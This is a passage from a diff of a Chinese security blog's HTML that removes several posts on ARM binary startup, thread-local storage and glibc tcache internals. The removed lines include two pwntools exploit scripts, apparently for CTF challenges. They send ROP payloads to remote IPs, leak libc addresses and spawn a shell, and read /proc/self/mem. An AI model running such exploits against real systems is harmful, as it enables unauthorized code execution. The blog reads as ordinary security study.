-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x8b98    mov    fp, #0</span><br><span class="line">   0x8b9c    mov    lr, #0</span><br><span class="line">   0x8ba0    pop    &#123;r1&#125;</span><br><span class="line">   0x8ba4    mov    r2, sp</span><br><span class="line">   0x8ba8    str    r2, [sp, #-4]!</span><br><span class="line">   0x8bac    str    r0, [sp, #-4]!</span><br><span class="line">   0x8bb0    ldr    ip, [pc, #0x10]</span><br><span class="line">   0x8bb4    str    ip, [sp, #-4]!</span><br><span class="line">   0x8bb8    ldr    r0, [pc, #0xc]</span><br><span class="line">   0x8bbc    ldr    r3, [pc, #0xc]</span><br><span class="line">   0x8bc0    bl     #0x9ebc</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ sp  0xf6fff1a0 ◂— 0x1</span><br><span class="line">01:0004│     0xf6fff1a4 —▸ 0xf6fff334 ◂— &apos;./typo&apos;</span><br><span class="line">02:0008│     0xf6fff1a8 ◂— 0x0</span><br><span class="line">03:000c│     0xf6fff1ac —▸ 0xf6fff33b ◂— 0x752f3d5f (&apos;_=/u&apos;)</span><br><span class="line">04:0010│     0xf6fff1b0 —▸ 0xf6fff34f ◂— 0x54554158 (&apos;XAUT&apos;)</span><br><span class="line">05:0014│     0xf6fff1b4 —▸ 0xf6fff372 ◂— 0x5353454c (&apos;LESS&apos;)</span><br><span class="line">06:0018│     0xf6fff1b8 —▸ 0xf6fff394 ◂— 0x5f4b5447 (&apos;GTK_&apos;)</span><br><span class="line">07:001c│     0xf6fff1bc —▸ 0xf6fff3a7 ◂— 0x5f474458 (&apos;XDG_&apos;)</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0     8b98</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.text:00008B9C                 MOV     LR, #0</span><br><span class="line">.text:00008BA0                 LDR     R1, [SP+arg_0],#4</span><br><span class="line">.text:00008BA4                 MOV     R2, SP</span><br><span class="line">.text:00008BA8                 STR     R2, [SP,#-4+arg_0]!</span><br><span class="line">.text:00008BAC                 STR     R0, [SP,#var_4]!</span><br><span class="line">.text:00008BB0                 LDR     R12, =__libc_thread_freeres</span><br><span class="line">.text:00008BB4                 STR     R12, [SP,#4+var_8]!</span><br><span class="line">.text:00008BB8                 LDR     R0, =sub_8F00//这个函数是main</span><br><span class="line">.text:00008BBC                 LDR     R3, =sub_A5EC</span><br><span class="line">.text:00008BC0                 BL      sub_9EBC</span><br><span class="line">.text:00008BC4                 BL      sub_F0E0</span><br></pre></td></tr></table></figure>
-<p>arm架构按r0，r1的顺序使用寄存器，所以让r0为/bin/sh再调用system就好了</p>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/11/10/tls/">tls</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="tls"><a href="#tls" class="headerlink" title="tls"></a>tls</h1><p>线程本地存储</p>
-<p>Linux的glibc使用GS寄存器来访问TLS，GS指向TEB，gs寄存器在线程切换时并不改变，而是采用更改相应偏移中内容，来切换。</p>
-<p>另外对于线程来说，他的栈是有限的，是用过mmap创建的。</p>
-<p>这是我修改过用来测试的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">__thread int var = 0;   // var定义为线程变量，每个数线拥有一份，这玩意不初始化在tbss，初始化在tdata</span><br><span class="line"></span><br><span class="line">void* worker(void* arg);  </span><br><span class="line"></span><br><span class="line">int main()&#123;  </span><br><span class="line">    pthread_t pid1,pid2;  </span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pid1,NULL,worker,(void *)0);  </span><br><span class="line">    pthread_create(&amp;pid2,NULL,worker,(void *)1);  </span><br><span class="line"></span><br><span class="line">    pthread_join(pid1,NULL);  </span><br><span class="line">    pthread_join(pid2,NULL);  </span><br><span class="line"></span><br><span class="line">    return 0;  </span><br><span class="line">&#125;  </span><br><span class="line">void* worker(void* arg)&#123;  </span><br><span class="line">    int idx = (int)arg;</span><br><span class="line">    int i=0;</span><br><span class="line">    int j=0;</span><br><span class="line">    int e=0;</span><br><span class="line">    while(1) &#123;</span><br><span class="line">	i++;</span><br><span class="line">	j++;</span><br><span class="line"></span><br><span class="line">	e++;</span><br><span class="line">	var++;</span><br><span class="line"> asm volatile(&quot;mov %fs:0,%rax;&quot;);  </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>TLS如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">线程2的tls如下 </span><br><span class="line">0x7ffff77ef700是fs:[0]可以看到他指向自己，在栈底（这个偏移是固定的，如果找不到地址，那么从栈底往上找一下就好）</span><br><span class="line">0x7ffff77ef6f0:	0x0000000000000000	0x0003cb0300000000</span><br><span class="line">0x7ffff77ef700:	0x00007ffff77ef700	0x0000000000602020</span><br><span class="line">0x7ffff77ef710:	0x00007ffff77ef700	0x0000000000000001</span><br><span class="line">0x7ffff77ef720:	0x0000000000000000	0x3388f717cab24000</span><br><span class="line">0x7ffff77ef730:	0x86ad80d7b8682fb4	0x0000000000000000</span><br><span class="line">0x7ffff77ef740:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff77ef750:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff77ef760:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff77ef770:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
-<p>创建线程后的栈</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">主线程</span><br><span class="line">RBP  0x7fffffffded0 —▸ 0x4007c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdeb0 —▸ 0x4007c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">thread1</span><br><span class="line">*RBP  0x7ffff77eef50 ◂— 0x0</span><br><span class="line">*RSP  0x7ffff77eef50 ◂— 0x0</span><br></pre></td></tr></table></figure>
-<p>内存如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">         0x400000           0x401000 r-xp     1000 0      /home/j/2</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/j/2</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/j/2</span><br><span class="line">          0x602000           0x623000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7ffff6fef000     0x7ffff6ff0000 ---p     1000 0      </span><br><span class="line">    0x7ffff6ff0000     0x7ffff77f0000 rw-p   800000 0      </span><br><span class="line">    0x7ffff77f0000     0x7ffff79b0000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff79b0000     0x7ffff7bb0000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bb0000     0x7ffff7bb4000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bb4000     0x7ffff7bb6000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bb6000     0x7ffff7bba000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7bba000     0x7ffff7bd2000 r-xp    18000 0      /lib/x86_64-linux-gnu/libpthread-2.23.so</span><br><span class="line">    0x7ffff7bd2000     0x7ffff7dd1000 ---p   1ff000 18000  /lib/x86_64-linux-gnu/libpthread-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd2000 r--p     1000 17000  /lib/x86_64-linux-gnu/libpthread-2.23.so</span><br><span class="line">    0x7ffff7dd2000     0x7ffff7dd3000 rw-p     1000 18000  /lib/x86_64-linux-gnu/libpthread-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdb000     0x7ffff7fdf000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7ff8000     0x7ffff7ffa000 r--p     2000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
-<p>worker代码，可以看到，对于thread类的变量，使用fs来存储的，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    eax, dword ptr fs:[0xfffffffffffffffc]</span><br><span class="line"> ► 0x4007e4 &lt;worker+36&gt;    add    eax, 1</span><br><span class="line">   0x4007e7 &lt;worker+39&gt;    mov    dword ptr fs:[0xfffffffffffffffc], eax</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/11/10/tcache/">tcache</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="tcache源码"><a href="#tcache源码" class="headerlink" title="tcache源码"></a>tcache源码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">static __thread char tcache_shutting_down = 0;</span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br><span class="line">线程变量</span><br><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
-<p>采用后释放先使用的原则</p>
-<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>如果size小于tcache大小，并且tcache机制打开，并且tcache相应的大小存在chunk就返回tcache</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tcache_get (size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  return (void *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>如果大小小于最大值，直接以单链表的方式卸载chunk，并且不检查大小，可以看到tcache是个不检查大小的fastbin。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">      if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = &quot;malloc(): memory corruption (fast)&quot;;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              return NULL;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">	  /* While we&apos;re here, if we see other chunks of the same size,</span><br><span class="line">	     stash them in the tcache.  */</span><br><span class="line">	  size_t tc_idx = csize2tidx (nb);</span><br><span class="line">	  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">	      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (pp = *fb) != NULL)</span><br><span class="line">		&#123;</span><br><span class="line">		  REMOVE_FB (fb, tc_victim, pp);</span><br><span class="line">		  if (tc_victim != 0)</span><br><span class="line">		    &#123;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  if (tc_victim != 0)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      if (av != &amp;main_arena)</span><br><span class="line">	set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>fastbin结束后会把同样大小的其他chunk放入tcache（smallbin也一样不再重复贴了，unlnik贴一下）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">	      if (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = 1;</span><br><span class="line">		  continue;</span><br><span class="line">		&#125;</span><br><span class="line">	      else</span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br></pre></td></tr></table></figure>
-<p>unsortbin会找到一个会往tcache里放，放满了就返回。</p>
-<h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    if (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	return;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br><span class="line">小于大小，并且没满，直接放入。</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/10/21/漏洞挖掘/">漏洞挖掘</a></h1>
+    <h1 class="title"><a href="/2018/12/11/漏洞挖掘/">漏洞挖掘</a></h1>
   
 
     </header>
@@ -498,7 +121,7 @@ fuzzing
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -518,143 +141,10 @@ fuzzing
     <header>
       
         <div class="icon"></div>
-     
-      
-      
-  
-    <h1 class="title"><a href="/2018/10/21/文件读写内存实例/">文件读写内存实例</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># level 3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">attack()</span><br><span class="line">change_host()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io2 = process(<span class="string">'./play'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io2 = remote(<span class="string">'47.104.90.157'</span>, <span class="number">30003</span>)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io2.recvuntil(<span class="string">'login:'</span>)</span><br><span class="line">io2.sendline(name)</span><br><span class="line">io2.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">io2.close()</span><br><span class="line">hacking(<span class="number">1</span>)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./play'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(elf.plt[<span class="string">'write'</span>]) + p32(<span class="number">0x80492C0</span>) + p32(<span class="number">1</span>) +</span><br><span class="line">p32(elf.got[<span class="string">'read'</span>]) + p32(<span class="number">4</span>))</span><br><span class="line">io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_addr + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br><span class="line">log.info(<span class="string">'bin_sh:%#x'</span> % bin_sh)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh))</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io = process(<span class="string">'./fileManager'</span>, aslr=<span class="keyword">False</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:</span><br><span class="line"><span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x56555F2C\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">'47.104.188.138'</span>, <span class="number">30007</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mod</span><span class="params">(name, offset, size)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\xae\xb9'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_mod</span><span class="params">(name, offset, size, content)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\x9d\x97\x3a'</span>)</span><br><span class="line">io.send(content)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io.recvuntil(<span class="string">'FTP:'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">read_mod(<span class="string">'/proc/self/maps'</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">elf_base = int(io.recvn(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'elf_base:%#x'</span> % elf_base)</span><br><span class="line">elf = ELF(<span class="string">'fileManager'</span>)</span><br><span class="line">read_mod(<span class="string">'/proc/self/mem'</span>, elf_base + elf.got[<span class="string">'open'</span>], <span class="number">0x100</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'open'</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-
-        </div>
         
-        
